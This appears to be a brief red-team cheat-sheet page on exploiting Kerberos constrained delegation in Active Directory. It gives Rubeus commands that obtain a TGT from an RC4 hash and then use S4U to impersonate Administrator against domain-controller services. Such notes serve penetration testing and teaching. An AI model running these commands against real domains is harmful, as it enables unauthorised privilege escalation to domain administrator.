# 🟢 Constrained Delegation

#### Explaining Constrained Delegation with Rubeus

Constrained Delegation is a security concept within Active Directory environments that allows designated services to request access to other services on behalf of a user. Rubeus, a powerful tool for Kerberos interaction and abuse, facilitates the exploitation and demonstration of this concept.

1. **Acquiring a Ticket Granting Ticket (TGT):** The first step involves acquiring a TGT for a user account (`svc_with_delegation`) that has been configured with constrained delegation permissions. The command below uses the RC4 hash of the user's password to request the TGT.

### Constrained Delegation with Rubeus

{% code overflow="wrap" %}
```
.\Rubeus.exe asktgt /user:svc_with_delegation /domain:targetdomain.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E
```
{% endcode %}

{% code overflow="wrap" %}
```
.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:Administrator /msdsspn:time/dc /ptt
```
{% endcode %}

{% code overflow="wrap" %}
```
.\Rubeus.exe s4u /user:sa_with_delegation /impersonateuser:Administrator /msdsspn:time/dc /altservice:ldap /ptt /rc4:2892D26CDF84D7A70E2EB3B9F05C425E
```
{% endcode %}
